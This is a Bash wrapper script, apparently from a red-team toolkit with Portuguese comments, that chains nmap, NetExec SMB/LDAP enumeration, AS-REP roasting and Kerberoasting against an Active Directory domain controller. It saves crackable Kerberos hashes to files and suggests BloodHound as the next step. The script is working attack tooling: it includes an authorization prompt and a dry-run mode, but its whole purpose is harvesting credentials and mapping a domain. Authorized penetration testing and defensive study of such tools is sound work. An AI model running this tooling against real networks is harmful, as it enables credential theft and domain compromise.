#!/usr/bin/env bash
# ============================================================================
# ad_recon.sh - Wrapper de recon em Active Directory a partir de um Linux
#
# Encadeia tres ferramentas comuns do toolkit Impacket / netexec:
#   1. nmap -p 88,389,636,445,3268 para checar servicos AD
#   2. nxc smb / ldap (NetExec) para enumeracao basica
#   3. GetNPUsers.py para AS-REP Roastable
#   4. GetUserSPNs.py para Kerberoastable
#
# Apenas em ambientes onde voce tem autorizacao escrita.
#
# Uso:
#   ./ad_recon.sh -t 10.0.0.10 -d corp.local -u user [-o out_dir]
#   ./ad_recon.sh -t 10.0.0.10 -d corp.local --userlist users.txt --no-creds
#
# Autor:   Samuel Ziger - RedTeam Essentials
# Versao:  2.0.0
# Licenca: MIT
# ============================================================================
set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
# shellcheck source=../../../lib/bash/rte_common.sh
source "$SCRIPT_DIR/../../../lib/bash/rte_common.sh"
rte::install_traps

TARGET=""; DOMAIN=""; USERNAME=""; PASSWORD=""; USERLIST=""
OUTDIR="./output"; NO_CREDS=0; PASSWORD_STDIN=0
PASSWORD_FILE=""

cleanup_password_file() {
    [[ -z "$PASSWORD_FILE" ]] || rm -f -- "$PASSWORD_FILE"
}
rte::add_cleanup cleanup_password_file

usage() {
    cat <<'EOF'
ad_recon.sh - Recon AD a partir de uma estacao Linux

Opcoes:
  -t, --target   <ip|host>    IP do Domain Controller
  -d, --domain   <fqdn>       FQDN do dominio (ex: corp.local)
  -u, --user     <usuario>    Usuario do dominio
      --password-stdin        Le a senha de uma linha do stdin
                              (padrao: prompt oculto quando ha usuario)
      --userlist <file>       Lista de usuarios para AS-REP Roasting
      --no-creds              Pula passos que exigem credenciais
  -o, --output   <dir>        Diretorio de saida (default ./output)
      --dry-run               Mostra acoes sem executar
  -h, --help                  Esta ajuda
EOF
}

while [[ $# -gt 0 ]]; do
    case "$1" in
        -t|--target)
            [[ $# -ge 2 ]] || rte::fatal "$1 requer um valor"
            TARGET="$2"; shift ;;
        -d|--domain)
            [[ $# -ge 2 ]] || rte::fatal "$1 requer um valor"
            DOMAIN="$2"; shift ;;
        -u|--user)
            [[ $# -ge 2 ]] || rte::fatal "$1 requer um valor"
            USERNAME="$2"; shift ;;
        --password-stdin) PASSWORD_STDIN=1 ;;
        -p|--pass)     rte::fatal "-p/--pass foi removido: use prompt oculto ou --password-stdin" ;;
        --userlist)
            [[ $# -ge 2 ]] || rte::fatal "$1 requer um valor"
            USERLIST="$2"; shift ;;
        --no-creds)    NO_CREDS=1 ;;
        -o|--output)
            [[ $# -ge 2 ]] || rte::fatal "$1 requer um valor"
            OUTDIR="$2"; shift ;;
        --dry-run)     RTE_DRYRUN=1 ;;
        -h|--help)     usage; exit 0 ;;
        *) rte::fatal "Argumento desconhecido: $1" ;;
    esac
    shift
done

rte::banner "AD Recon" "2.0.0"
[[ -z "$TARGET" || -z "$DOMAIN" ]] && { usage; rte::fatal "target e domain sao obrigatorios"; }
rte::is_valid_ipv4 "$TARGET" || rte::is_valid_domain "$TARGET" || rte::fatal "target deve ser um host/IP valido"
rte::is_valid_domain "$DOMAIN" || rte::fatal "dominio invalido: $DOMAIN"
[[ -z "$USERLIST" || -f "$USERLIST" ]] || rte::fatal "userlist inexistente: $USERLIST"
rte::confirm_authorization
rte::require_cmd nmap

if [[ $NO_CREDS -eq 0 && -n "$USERNAME" ]]; then
    if [[ "$RTE_DRYRUN" == "1" ]]; then
        PASSWORD="DRY_RUN_REDACTED"
    elif (( PASSWORD_STDIN == 1 )); then
        IFS= read -r PASSWORD
    elif [[ -n "${RTE_AD_PASSWORD:-}" ]]; then
        PASSWORD="$RTE_AD_PASSWORD"
    elif [[ -t 0 ]]; then
        read -r -s -p "Senha de $DOMAIN/$USERNAME: " PASSWORD
        printf '\n'
    else
        rte::fatal "senha ausente; use --password-stdin ou RTE_AD_PASSWORD"
    fi
    [[ -n "$PASSWORD" ]] || rte::fatal "senha vazia"
fi

[[ "$RTE_DRYRUN" == "1" ]] || mkdir -p "$OUTDIR"
STAMP="$(date +%Y%m%d_%H%M%S)"
PREFIX="$OUTDIR/ad_recon_${DOMAIN}_${STAMP}"

# --- 1. Nmap de servicos AD -------------------------------------------------
rte::info "Nmap dos servicos AD em $TARGET..."
rte::run nmap -Pn -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 \
    -sV --script "(default and safe) and not brute" \
    -oA "${PREFIX}_nmap" "$TARGET" || rte::warn "Nmap retornou erro."

# --- 2. NetExec basico ------------------------------------------------------
if command -v nxc >/dev/null 2>&1; then
    rte::info "NetExec SMB --shares (anonimo)..."
    if [[ "$RTE_DRYRUN" == "1" ]]; then
        rte::warn "[DRY-RUN] NetExec SMB anonimo"
    else
        nxc smb "$TARGET" -u '' -p '' --shares >"${PREFIX}_nxc_smb_anon.txt" 2>&1 || true
    fi

    if [[ $NO_CREDS -eq 0 && -n "$USERNAME" && -n "$PASSWORD" ]]; then
        if [[ "$RTE_DRYRUN" != "1" ]]; then
            PASSWORD_FILE="$(mktemp "${TMPDIR:-/tmp}/rte-ad-password.XXXXXX")"
            chmod 600 "$PASSWORD_FILE"
            printf '%s\n' "$PASSWORD" >"$PASSWORD_FILE"
        fi
        rte::info "NetExec SMB com credenciais..."
        if [[ "$RTE_DRYRUN" == "1" ]]; then
            rte::warn "[DRY-RUN] NetExec SMB autenticado (senha redigida)"
        else
            rte::run_sensitive "NetExec SMB autenticado" \
                nxc smb "$TARGET" -d "$DOMAIN" -u "$USERNAME" -p "$PASSWORD_FILE" --shares --pass-pol \
                >"${PREFIX}_nxc_smb_creds.txt" 2>&1 || true
        fi
        rte::info "NetExec LDAP --users e --groups..."
        if [[ "$RTE_DRYRUN" == "1" ]]; then
            rte::warn "[DRY-RUN] NetExec LDAP autenticado (senha redigida)"
        else
            rte::run_sensitive "NetExec LDAP autenticado" \
                nxc ldap "$TARGET" -d "$DOMAIN" -u "$USERNAME" -p "$PASSWORD_FILE" --users --groups \
                >"${PREFIX}_nxc_ldap.txt" 2>&1 || true
        fi
    fi
else
    rte::warn "nxc (NetExec) nao instalado. Pule essa etapa."
fi

# --- 3. AS-REP Roasting -----------------------------------------------------
if command -v GetNPUsers.py >/dev/null 2>&1; then
    rte::info "Tentando AS-REP Roasting (DONT_REQ_PREAUTH)..."
    userlist_args=()
    [[ -n "$USERLIST" ]] && userlist_args=(-usersfile "$USERLIST")
    rte::run GetNPUsers.py "$DOMAIN/" -dc-ip "$TARGET" -no-pass -request \
        "${userlist_args[@]}" -outputfile "${PREFIX}_asrep.hashes" || \
        rte::warn "GetNPUsers nao retornou hashes."
else
    rte::warn "Impacket GetNPUsers.py nao encontrado."
fi

# --- 4. Kerberoasting -------------------------------------------------------
if [[ $NO_CREDS -eq 0 && -n "$USERNAME" && -n "$PASSWORD" ]]; then
    if command -v GetUserSPNs.py >/dev/null 2>&1; then
        rte::info "Kerberoasting (SPNs)..."
        if [[ "$RTE_DRYRUN" == "1" ]]; then
            rte::warn "[DRY-RUN] GetUserSPNs autenticado (senha redigida)"
        elif ! printf '%s\n' "$PASSWORD" | GetUserSPNs.py "$DOMAIN/$USERNAME" -dc-ip "$TARGET" \
            -request -outputfile "${PREFIX}_kerberoast.hashes"; then
            rte::warn "GetUserSPNs nao retornou hashes."
        fi
    else
        rte::warn "Impacket GetUserSPNs.py nao encontrado."
    fi
fi

rte::success "Recon AD concluido. Arquivos com prefixo: ${PREFIX}_*"
rte::info  "Proximo passo: alimentar BloodHound (bloodhound.py / nxc ldap --bloodhound)."
